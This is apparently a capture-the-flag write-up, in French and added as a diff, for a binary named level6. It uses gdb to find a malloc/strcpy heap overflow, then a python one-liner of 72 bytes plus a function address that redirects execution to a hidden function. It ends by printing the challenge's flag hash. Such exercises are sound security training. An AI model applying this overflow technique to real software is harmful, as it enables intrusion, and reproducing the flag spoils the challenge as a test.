@@ -1,0 +1,34 @@
+./level6 
+Segmentation fault (core dumped)
+
+./level6 eqw
+Nope
+
+gdb ./level6
+
+info function
+0x08048454  n
+0x08048468  m
+0x0804847c  main
+
+quand on regarde les disas de n m et main on peut voir que n et notre objectif a atteindre et que m d'appres moi ne sert a rien
+
+du coup dans le main il y a malloc et strcpy je pense que malloc n'est pas utilisable mais pour strcpy il doit y avoir un truc a faire
+
+bon j'ai trouver qu'on pouvais appeler la fonction n en sortant des "limite" de strcpy
+
+du coup j'ai regarder une video qui nous aide beaucoup a comprendre les malloc
+https://www.youtube.com/watch?v=HPDBOhiKaD8&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=27
+
+donc on a malloc de 64
+0x08048485 <+9>:     movl   $0x40,(%esp)
+0x0804848c <+16>:    call   0x8048350 <malloc@plt>
+
+du coup 64 + 8 pour le block on sait que si on ecrit 72 cara et l'addresse du "jump" ou on veut aller ca devrai passer et nous voulont arriver au debut de n 
+   0x08048454 <+0>:     push   %ebp
+54 84 04 08 du coup 
+
+on fait donc la surcharge de 72 cara et notre addresse
+./level6 $(python -c "print('.' * 72 + '\x54\x84\x04\x08')")
+et hop
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
